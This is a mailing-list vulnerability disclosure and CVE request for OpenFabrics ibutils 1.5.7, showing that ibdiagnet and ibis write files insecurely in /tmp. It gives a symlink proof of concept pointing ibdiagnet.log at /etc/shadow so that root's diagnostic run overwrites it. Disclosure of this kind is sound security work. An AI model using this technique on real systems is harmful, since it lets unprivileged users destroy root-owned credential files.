Subject: Re: CVE request: ibutils improper use of files in /tmp

Sorry I missed sending this to the oss-securityï»¿ list:

OpenFabrics ibutils 1.5.7 /tmp clobbering vulnerability

3/6/2013

The infiniband diagnostic utiltiy handles files in /tmp insecurely. A malicious user can clobber root owned files with common symlink attacks.

http://www.openfabrics.org/downloads/ibutils/

[nobody@...b01 tmp]$ ln -s /etc/shadow ibdiagnet.log
[nobody@...b01 tmp]$ ls -l ibdiagnet.log lrwxrwxrwx 1 nobody users 11 Mar 6 18:19 ibdiagnet.log -> /etc/shadow [nobody@...b01 tmp]$
The following files are created, I imagine anyone of them can be used.

[root@...b01 tmp]# ls -l /tmp/ibdiagnet*
-rw-r--r-- 1 root root  57611 Mar  6 18:20 /tmp/ibdiagnet.db
-rw-r--r-- 1 root root    830 Mar  6 18:20 /tmp/ibdiagnet.fdbs
-rw-r--r-- 1 root root   5805 Mar  6 18:20 /tmp/ibdiagnet_ibis.log
-rw-r--r-- 1 root root   2359 Mar  6 18:20 /tmp/ibdiagnet.log
-rw-r--r-- 1 root root   7072 Mar  6 18:20 /tmp/ibdiagnet.lst
-rw-r--r-- 1 root root    456 Mar  6 18:20 /tmp/ibdiagnet.mcfdbs
-rw-r--r-- 1 root root    784 Mar  6 18:20 /tmp/ibdiagnet.pkey
-rw-r--r-- 1 root root   3348 Mar  6 18:20 /tmp/ibdiagnet.psl
-rw-r--r-- 1 root root 179228 Mar  6 18:20 /tmp/ibdiagnet.slvl
-rw-r--r-- 1 root root    193 Mar  6 18:20 /tmp/ibdiagnet.sm

After root runs a diagnostic command:

[root@...b01 tmp]# ibdiagnet -ls 10 -lw 4x -vlr Loading IBDIAGNET from: /usr/lib64/ibdiagnet1.5.7 -W- Topology file is not specified.

Reports regarding cluster links will use direct routes. Loading IBDM from: /usr/lib64/ibdm1.5.7 -W- A few ports of local device are up.

Since port-num was not specified (-p option), port 1 of device 1 will be used as the local port.

Symlinked files are overwritten:

ibis binary also creates files insecurely in /tmp: /tmp/ibis.log from the man page:

IBIS(1)             IB MANAGEMENT IN-BAND SERVICES PACKAGE             IBIS(1)

NAME
       ibis - IB management Inband Services - an extended TCL shell

SYNOPSYS
       ibis [-port_num ]

DESCRIPTION
       ibis is a TCL shell extended with interface for sending and receiving IB management datagrams (MADS).  To use this shell you
       will write TCL code that excersizes the regular TCL command and the special API provided by this extension. Interactive use is
       also possible and is greatly enhanced if tclreadline package is available on the machine.

       The following sub sections provide detailed definition for the API and global objects defined by the extension. The different
       MADs APIs are group by the management class.
